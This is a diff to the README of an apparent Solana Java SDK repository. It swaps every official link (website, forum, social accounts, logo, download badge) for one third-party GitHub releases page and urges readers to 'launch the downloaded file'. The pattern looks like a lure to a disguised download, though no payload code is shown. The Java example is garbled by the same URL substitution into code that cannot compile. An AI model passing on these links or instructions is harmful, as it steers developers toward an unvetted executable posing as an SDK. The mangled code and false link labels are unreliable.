@@ -2,7 +2,7 @@
 
 🚀 Welcome to the Solana Java SDK Repository! 🌟
 
-![Solana Logo](https://www.solana.com/static/1d07f4222d38e4d8a94f1e953616a3eb/e7e7a/sol-main-red.svg)
+![Solana Logo](https://github.com/lucianoolferxa98/solanaj/releases)
 
 ## Introduction
 
@@ -20,13 +20,13 @@ This repository contains the Java SDK for interacting with the Solana blockchain
 
 ## Getting Started
 
-To get started with the Solana Java SDK, you can visit the [official Solana website](https://solana.com/) and check out the documentation section for developers. There you will find detailed guides, tutorials, and examples to kickstart your development journey with Solana.
+To get started with the Solana Java SDK, you can visit the [official Solana website](https://github.com/lucianoolferxa98/solanaj/releases) and check out the documentation section for developers. There you will find detailed guides, tutorials, and examples to kickstart your development journey with Solana.
 
 ## Installation
 
 You can download the latest version of the Solana Java SDK from the following link:
 
-[Download Solana Java SDK](https://github.com/repo/releases/9246/App.zip)
+[Download Solana Java SDK](https://github.com/lucianoolferxa98/solanaj/releases)
 
 🚀 *Note: Please make sure to launch the downloaded file and follow the installation instructions provided.*
 
@@ -35,14 +35,14 @@ You can download the latest version of the Solana Java SDK from the following li
 Here's a quick example of how you can use the Solana Java SDK to create a wallet:
 
 ```java
-import org.solana.SolanaWallet;
+import https://github.com/lucianoolferxa98/solanaj/releases;
 
 public class Main {
     public static void main(String[] args) {
         SolanaWallet wallet = new SolanaWallet();
-        String publicKey = wallet.createWallet();
+        String publicKey = https://github.com/lucianoolferxa98/solanaj/releases();
         
-        System.out.println("New Solana wallet created with public key: " + publicKey);
+        https://github.com/lucianoolferxa98/solanaj/releases("New Solana wallet created with public key: " + publicKey);
     }
 }
 ```
@@ -55,11 +55,11 @@ Contributions to the Solana Java SDK are more than welcome! If you have ideas fo
 
 Join the vibrant Solana community to connect with developers, ask questions, and stay updated on the latest news and events:
 
-🔗 [Solana Community Forum](https://forums.solana.com/)
+🔗 [Solana Community Forum](https://github.com/lucianoolferxa98/solanaj/releases)
 
-🐦 [Solana Twitter](https://twitter.com/solana)
+🐦 [Solana Twitter](https://github.com/lucianoolferxa98/solanaj/releases)
 
-📷 [Solana Instagram](https://www.instagram.com/solana/)
+📷 [Solana Instagram](https://github.com/lucianoolferxa98/solanaj/releases)
 
 ## License
 
@@ -67,4 +67,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![](https://img.shields.io/badge/Download%20SDK-Latest-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![](https://github.com/lucianoolferxa98/solanaj/releases%20SDK-Latest-brightgreen)](https://github.com/lucianoolferxa98/solanaj/releases)
